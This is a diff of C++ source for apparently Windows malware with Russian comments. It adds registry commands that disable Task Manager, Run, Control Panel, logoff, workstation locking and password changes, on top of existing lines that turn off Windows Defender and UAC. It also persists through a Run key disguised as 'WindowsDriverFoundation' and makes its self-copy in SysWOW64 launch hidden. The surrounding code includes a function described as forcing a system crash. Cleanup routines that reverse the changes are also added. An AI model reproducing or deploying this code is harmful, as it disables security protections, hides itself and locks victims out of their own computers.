@@ -19,6 +19,13 @@ void DefenderOwner(){
     system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f");
     system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f");
 
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
+	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
     // Отключение UAC
     system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
 }
@@ -43,10 +50,8 @@ void addToStartup() {
     GetModuleFileName(NULL, path, MAX_PATH);
     
     // Добавление в реестр для автозагрузки
-    std::cout << "Adding to startup..." << std::endl;
     std::string command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /t REG_SZ /d \"" + std::string(path) + "\" /f";
     system(command.c_str());
-    std::cout << "Added to startup successfully." << std::endl;
 }
 void reset() {  // краш системы 
 	// Try to force **BSOD** first
@@ -131,16 +136,41 @@ bool copyAndRunSelf() {
         return 0;
     }
 
-
+    
     // Копируем файл
     if (CopyFile(path, destination, FALSE)) {
         std::cout << "Файл успешно скопирован в C:\\Windows\\SysWOW64." << std::endl;
     }
 
     // Запускаем свою копию
-    if (ShellExecute(NULL, "open", destination, NULL, NULL, SW_SHOWNORMAL)) {
+    if (ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE)) {
         std::cout << "Успешно запущена копия программы." << std::endl;
         return 1;
     }
     return 1;
+}
+void cleanreg() {
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /f");
+    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f");
+
+    system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /f");
+	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /f");
+	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /f");
+	system("reg DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /f");
+	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /f");
+	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /f");
+	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /f");
+    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v winlogon /f");
+}
+void cleanfile() {
+    const char* filePath = "C:\\Windows\\SysWOW64\\lafkildatnn.dat";
+    if (DeleteFile(filePath)) {
+        std::cout << "File successfully deleted!" << std::endl;
+    }
 }
